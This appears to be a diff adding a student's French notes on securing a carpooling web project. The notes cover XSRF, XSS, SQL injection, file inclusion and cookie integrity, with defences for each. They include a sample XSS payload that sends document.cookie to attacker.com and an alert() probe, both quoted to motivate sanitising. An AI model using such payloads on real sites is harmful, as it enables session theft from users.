@@ -1,0 +1,109 @@
+Différentes inputs :
+	- Page d'accueil : login, passwd
+	- Inscription : login, email, password
+	- Proposition trajet : adresses (données à Google et à la BD!), description
+	- Recherche trajet : adresses (données à G et à la BD)
+	
+Code externe intégré avec la balise script => Code de confiance
+Peut-être passer en iframe pour une gestion plus sécurisée...
+
+Attaques serveur :
+
+1) XSRF
+Add a secret that the attacker cannot guess
+
+2) Session integrity attack
+
+
+3) XSS
+
+4) Code injection attack
+
+- Data-tier code injection (SQL)
+Solutions : 
+- Vérification des données user avec expressions régulières ?
+- Echappement des caractères spéciaux ou requêtes préparées.
+Requêtes préparées en PHP : On écrit une requête à trous sans les paramètres.
+La requête est analysée et compilée.
+Les paramètres sont ensuite donnés et le driver MySQL pour PHP gère automatiquement l'échappement des caractères spéciaux.
+
+- Client-tier code injection
+<script> 
+ alert(“attack!”);
+</script>
+Fonction sanitize de utils.php qui appelle htmlspecialchars
+Transforme ainsi :
+&lt;script&gt;alert("coucou");&lt;/script&gt;
+On évite attaque de vol de cookie du genre :
+<script>window.location = “http://attacker.com?cookie=” + document.cookie; </script>
+
+Solutions : sanitize + precise tainting
+"Taint analysis identifies inputs that
+come from untrustworthy sources (including user input) and tracks all data
+that is affected by those input values. An error is reported if tainted data is
+passed as a security-critical parameter, such as the command passed to an
+exec command."
+En gros, faut identifier données sensibles ^^'.
+
+Liste de vecteurs d'attaques pour les injections donnés dans le cours 3 diapo 20
+
+- Server-tier code injection
+
+5) - LFI : OK On fait pas de include en PHP en utilisant les données utilisateur.
+L'utilisateur ne peut pas nous forcer à inclure un fichier important du serveur.
+/ RFI : OK On n'inclut pas d'URL externe
+Par sécurité, dans php.ini : allow_url_include Off
+
+Côté client :
+
+1) Pas de failles Javascript
+Comme on utilise <script> pour le mashup, Google a accès à #global via window...
+
+2) Prototype chain utilisée
+On définit fonction d'un certain type avec un new et on accède aux vars du type parent.
+y.x
+PAS D EXEMPLE CODE
+Faire par exemple :
+var req = new Requestblabla(..);
+req.plop...
+
+3) Scope chain utilisée
+Dans nouvel objet, on utilise var definie dans objet
+var parametresTrajet = {origin:coordonneesDepart, destination:coordonneesArrivee, travelMode:google.maps.DirectionsTravelMode.DRIVING};
+C'est bon comme ex non ?
+
+4) This utilisé dans des fonctions (ACTUELLEMENT PAS DE THIS UTILISE)
+this lié à l'object global sauf quand on fait new !
+
+5) Recursion (elle voulait par exemple des while, y a des for ^^')
+
+6) Manipulation du DOM
+
+Liste des attaques donnée par la prof :
+- Phishing attacks (eg MySpace, 2006) => Sol : HTTPS
+- Session integrity attacks (eg Dansie shopping cart, 2006)
+- Cross site request forgery attacks (eg Gmail, 2007)
+- Navigation policy based attacks (eg Guninski/Citibank, 1999)
+- Javascript leaks
+- Local/Remote file inclusion (LFI/RFI)
+- Code Injection attacks (eg CardSystems 2005)
+- Cross Site Scripting attacks (XSS) 
+- Mashup based attacks
+- http authentication attacks
+- DOS attacks (Captchas)
+
+Access : SSL/TLS
+
+Attention, les champs hidden c'est pas bien !
+Il vaut mieux utiliser la variable $_SESSION et donc les cookies.
+
+A faire :
+set-cookie(“amount”,$amount); 
+
+Content-type:text/html
+Cookie: Amount = 20$
+
+To make it secure it is necessary to add a “MAC” (message-authenticatedcode) to the amount:
+Cookie: Amount = 20$; HMAC(ServerKey, 20)
+
+
